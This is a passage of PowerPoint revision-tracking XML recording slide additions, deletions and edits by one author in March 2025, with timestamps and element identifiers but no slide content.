        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-12T16:00:01.855" v="14" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3535431228" sldId="428"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T09:11:06.861" v="305"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3772480871" sldId="428"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T09:11:06.861" v="305"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3077237454" sldId="429"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T09:11:06.861" v="305"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3182079352" sldId="440"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T09:11:06.861" v="305"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3136726420" sldId="441"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T09:11:06.861" v="305"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="4239463834" sldId="442"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T09:11:06.861" v="305"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="4020129732" sldId="443"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T09:11:06.861" v="305"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="29321398" sldId="444"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T09:11:06.861" v="305"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="547814166" sldId="445"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T09:11:06.861" v="305"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3708179619" sldId="446"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T09:11:06.861" v="305"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="483222396" sldId="448"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T09:11:06.861" v="305"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="893476586" sldId="449"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T09:11:06.861" v="305"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1650498826" sldId="450"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-12T16:00:01.855" v="14" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="413582869" sldId="462"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T09:07:22.681" v="304"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="203229447" sldId="463"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T09:04:08.967" v="301"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3722655817" sldId="465"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T09:04:08.967" v="301"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2022026658" sldId="466"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T09:04:08.967" v="301"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2135918341" sldId="467"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T09:04:08.967" v="301"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1205810816" sldId="468"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T09:04:08.967" v="301"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3222348994" sldId="469"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T09:04:08.967" v="301"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2639562663" sldId="470"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T09:04:08.967" v="301"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3137595583" sldId="471"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T09:04:08.967" v="301"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="118295799" sldId="472"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp add mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T11:00:41.459" v="313" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3978145182" sldId="473"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T11:00:41.459" v="313" actId="20577"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="3978145182" sldId="473"/>
            <ac:spMk id="5122" creationId="{8538CEF5-7680-C06D-B2A7-3BA94699609F}"/>
          </ac:spMkLst>
        </pc:spChg>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T09:07:22.681" v="304"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1911490794" sldId="474"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T09:07:22.681" v="304"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2251333572" sldId="475"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T09:07:22.681" v="304"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3482510535" sldId="476"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-12T16:00:01.855" v="14" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="765832598" sldId="477"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T09:07:22.681" v="304"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3558611693" sldId="477"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T09:07:22.681" v="304"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3151704039" sldId="478"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T09:07:22.681" v="304"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1228791965" sldId="479"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T09:07:22.681" v="304"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="827267411" sldId="480"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T09:07:22.681" v="304"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1361679320" sldId="481"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-12T16:00:01.855" v="14" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2418439724" sldId="481"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T09:07:22.681" v="304"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="4205689779" sldId="482"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T09:07:22.681" v="304"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1090567978" sldId="483"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-12T16:00:01.855" v="14" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1855680757" sldId="483"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T09:07:22.681" v="304"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1532593948" sldId="484"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T09:07:22.681" v="304"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="121719461" sldId="485"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-12T16:00:01.855" v="14" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="4005202096" sldId="486"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T09:07:22.681" v="304"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1697829239" sldId="487"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T09:07:22.681" v="304"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1096562843" sldId="488"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T09:07:22.681" v="304"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3971291027" sldId="489"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T09:11:06.861" v="305"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3818375063" sldId="490"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T09:11:06.861" v="305"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="991312575" sldId="491"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T09:11:06.861" v="305"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2514893275" sldId="492"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T09:11:06.861" v="305"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3483062112" sldId="493"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T09:11:06.861" v="305"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3302575555" sldId="494"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T09:11:06.861" v="305"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3208410718" sldId="495"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T09:11:06.861" v="305"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="814342819" sldId="496"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T09:11:06.861" v="305"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2452342595" sldId="507"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T09:11:06.861" v="305"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3071100166" sldId="508"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T09:11:06.861" v="305"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2267150495" sldId="509"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp add del mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T19:08:02.890" v="1590" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2063936211" sldId="510"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T19:08:02.890" v="1590" actId="20577"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="2063936211" sldId="510"/>
            <ac:spMk id="5122" creationId="{95C280F7-C759-BE33-6CE8-960D576200B7}"/>
          </ac:spMkLst>
        </pc:spChg>
      </pc:sldChg>
      <pc:sldChg chg="modSp add mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T11:20:56.594" v="554" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1533819548" sldId="511"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T11:12:02.429" v="320" actId="20577"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="1533819548" sldId="511"/>
            <ac:spMk id="4" creationId="{FD61A333-4642-FD8E-9C43-235C10305E9C}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="mod">
          <ac:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T11:20:56.594" v="554" actId="20577"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="1533819548" sldId="511"/>
            <ac:spMk id="5" creationId="{9C360BC6-B126-10C4-8F05-BB894950D5F0}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:picChg chg="mod">
          <ac:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T11:12:13.972" v="323" actId="1076"/>
          <ac:picMkLst>
            <pc:docMk/>
            <pc:sldMk cId="1533819548" sldId="511"/>
            <ac:picMk id="3" creationId="{66EAD1D2-F367-F495-17BD-489533E818DC}"/>
          </ac:picMkLst>
        </pc:picChg>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp add mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T11:17:01.617" v="461" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="902064949" sldId="512"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T11:17:01.617" v="461" actId="20577"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="902064949" sldId="512"/>
            <ac:spMk id="5" creationId="{2160C072-870E-2A27-7AE3-647B8F13AA43}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:picChg chg="del">
          <ac:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T11:12:18.024" v="325" actId="478"/>
          <ac:picMkLst>
            <pc:docMk/>
            <pc:sldMk cId="902064949" sldId="512"/>
            <ac:picMk id="3" creationId="{E8F638CB-27D8-1BA8-8E4E-3DCCE6604E1B}"/>
          </ac:picMkLst>
        </pc:picChg>
        <pc:picChg chg="add mod">
          <ac:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T11:15:28.712" v="335" actId="14100"/>
          <ac:picMkLst>
            <pc:docMk/>
            <pc:sldMk cId="902064949" sldId="512"/>
            <ac:picMk id="6" creationId="{7E9A7984-AA3F-6DD6-073B-69F06091FAB5}"/>
          </ac:picMkLst>
        </pc:picChg>
      </pc:sldChg>
      <pc:sldChg chg="addSp modSp add mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T11:17:55.202" v="494" actId="14100"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1686661305" sldId="513"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T11:17:12.475" v="492" actId="20577"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="1686661305" sldId="513"/>
            <ac:spMk id="5" creationId="{1A628F7D-01C2-9E43-1DB5-FC972FBC49EA}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:picChg chg="add mod">
          <ac:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T11:17:55.202" v="494" actId="14100"/>
          <ac:picMkLst>
            <pc:docMk/>
            <pc:sldMk cId="1686661305" sldId="513"/>
            <ac:picMk id="3" creationId="{29492706-387E-6C6F-253B-76C3B08A48A4}"/>
          </ac:picMkLst>
        </pc:picChg>
      </pc:sldChg>
      <pc:sldChg chg="addSp modSp add mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T11:18:44.566" v="545" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3351605550" sldId="514"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T11:18:44.566" v="545" actId="20577"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="3351605550" sldId="514"/>
            <ac:spMk id="5" creationId="{577B0540-B333-F228-A10D-187BD7EAE88E}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:picChg chg="add mod">
          <ac:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A9265C38-B650-4562-A8F5-8DB033515C30}" dt="2025-03-19T11:18:28.001" v="497" actId="1076"/>
          <ac:picMkLst>
            <pc:docMk/>
            <pc:sldMk cId="3351605550" sldId="514"/>
